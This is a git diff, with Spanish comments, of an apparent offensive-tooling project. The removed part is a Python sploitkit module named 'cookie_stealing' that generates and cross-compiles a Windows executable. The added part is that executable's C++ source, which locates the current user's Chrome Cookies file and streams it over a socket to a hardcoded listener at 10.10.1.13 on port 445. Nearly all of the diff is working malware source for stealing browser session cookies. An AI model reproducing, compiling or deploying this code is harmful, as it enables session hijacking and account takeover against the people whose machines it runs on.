@@ -1,46 +1,4 @@
-from sploitkit import *
-import os
-import subprocess
-from template import Procedure
 
-class cookie_stealing(Module):
-	""" Description Here
-
-	Author:  your name (your email)
-	Version: 1.0
-	"""
-
-	#MODULE OPTIONS
-	config  = Config({
-        Option(
-            'OPT', 												#option
-            "Description", 										#description
-            True,												#Required = True, Optional = False
-            #set_callback=lambda o: o.root._set_app_folder(), 	#execute a function if required
-        ): "default", 											#Default value
-    })
-
-	def run(self):
-		#Webroot
-		parent_path = "Prueba/sourcecodes/"
-		parent_webroot_path = "Prueba/webroot/"
-
-		c2client = ''.join(list(self.config.get('OPT'))) #Assign option value to variable
-
-		#ARGUMENTOS DEL CODIGO CPP
-
-		lhost = "10.10.1.13"
-		lport = 445
-		nombre_archivo_cookies = "Cookies"
-
-		#PARAMETROS PARA GENERAR LOS ARCHIVOS CPP y EXE
-		cppname = 'extraerCookies.cpp'
-		fullname = parent_path + cppname
-		exename = "extrae"
-		outfile = parent_webroot_path + exename
-
-
-		EXTRAERCOOKIES = '''
        #include<stdio.h>
        #include<winsock2.h>
        #include<math.h>
@@ -50,10 +8,10 @@ class cookie_stealing(Module):
        #include <lmcons.h>
        //Compilacion: i686-w64-mingw32-g++ enviarCookies.cpp -o envia -static-libgcc -static-libstdc++ -lwsock32
        #pragma comment(lib,"ws2_32.lib")
-       #define LHOST "%s"
-       #define LPORT %s
+       #define LHOST "10.10.1.13"
+       #define LPORT 445
        #define BUFF 1000
-       #define NOMARCH "%s"
+       #define NOMARCH "Cookies"
        #define CLOSESTR "TT2019B102"
        using namespace std;
 
@@ -74,18 +32,18 @@ class cookie_stealing(Module):
               DWORD username_len = UNLEN+1;
               GetUserName(username, &username_len);
               string user(username);      
-              string ruta_archivo = "C:\\\\Users\\\\" + user + "\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\" + nom_archivo;
+              string ruta_archivo = "C:\\Users\\" + user + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\" + nom_archivo;
 
               //printf("Iniciando Winsock");
               if (WSAStartup(MAKEWORD(2,2),&wsa) != 0){
-                     printf("Algo salio mal: %%d",WSAGetLastError());
+                     printf("Algo salio mal: %d",WSAGetLastError());
                      return 1;
               }
-              //printf("Inicializado\\n");
+              //printf("Inicializado\n");
               if((s = socket(AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET){
-                     printf("No se pudo crear el socket: %%d" , WSAGetLastError());
+                     printf("No se pudo crear el socket: %d" , WSAGetLastError());
               }
-              //printf("Socket creado\\n");
+              //printf("Socket creado\n");
               server.sin_addr.s_addr = inet_addr(LHOST);
               server.sin_family = AF_INET;
               server.sin_port = htons(LPORT);
@@ -93,7 +51,7 @@ class cookie_stealing(Module):
                      perror("Error al conectar ");
                      return 1;
               }
-              //printf("Conectado\\n");
+              //printf("Conectado\n");
 
               if((fc = fopen(ruta_archivo.c_str(), "rb"))== NULL){
                      perror("Algo salio mal ");
@@ -112,12 +70,12 @@ class cookie_stealing(Module):
               packetnumbers = (float)filelen / (float)BUFF;
               izquierda = (int)packetnumbers;
               derecha = (packetnumbers - (float)izquierda) * BUFF;
-              //printf("Longitud %%d, Division %%f, Parte izquierda %%d, Parte derecha %%d\\n", filelen, packetnumbers, izquierda, derecha);
+              //printf("Longitud %d, Division %f, Parte izquierda %d, Parte derecha %d\n", filelen, packetnumbers, izquierda, derecha);
               temp = filelen;
               i=0;
-              //printf("Enviando...\\n");
+              //printf("Enviando...\n");
               while(temp > BUFF){
-                     //printf("padding: %%d\\n", i);
+                     //printf("padding: %d\n", i);
                      memcpy(message, buffer+i, BUFF);
                      Sleep(200);
                      send(s, message, BUFF, 0);
@@ -129,22 +87,10 @@ class cookie_stealing(Module):
               memcpy(message, buffer+i, temp);
               send(s, message, temp, 0);
               send(s, CLOSESTR, strlen(CLOSESTR), 0);
-              //printf("Finalizado\\n");
+              //printf("Finalizado\n");
               fclose(fc);
               closesocket(s);
               return 0;
        }
 
-       ''' % (lhost, lport, nombre_archivo_cookies)
-		f = open(fullname,"w")
-		f.write(EXTRAERCOOKIES)
-		print("Archivo "+ fullname + " creado.")
-		#i686-w64-mingw32-g++ extraerCookies.cpp -o extrae -static-libgcc -static-libstdc++ -lwsock32
-		args = ["i686-w64-mingw32-g++", fullname, "-o", outfile, "-static-libgcc", "-static-libstdc++", "-lwsock32"]
-		subprocess.Popen(args)
-		print("Compilado {}.".format(outfile))
-		print("Inicia tu servidor local para recibir archivo.")
-		#time.sleep(5)
-		#args = ['terminator', '--new-tab', '-x', 'python3', 'base/modules/transferfiles/recvfiles.py']
-		#subprocess.Popen()
-		
+       
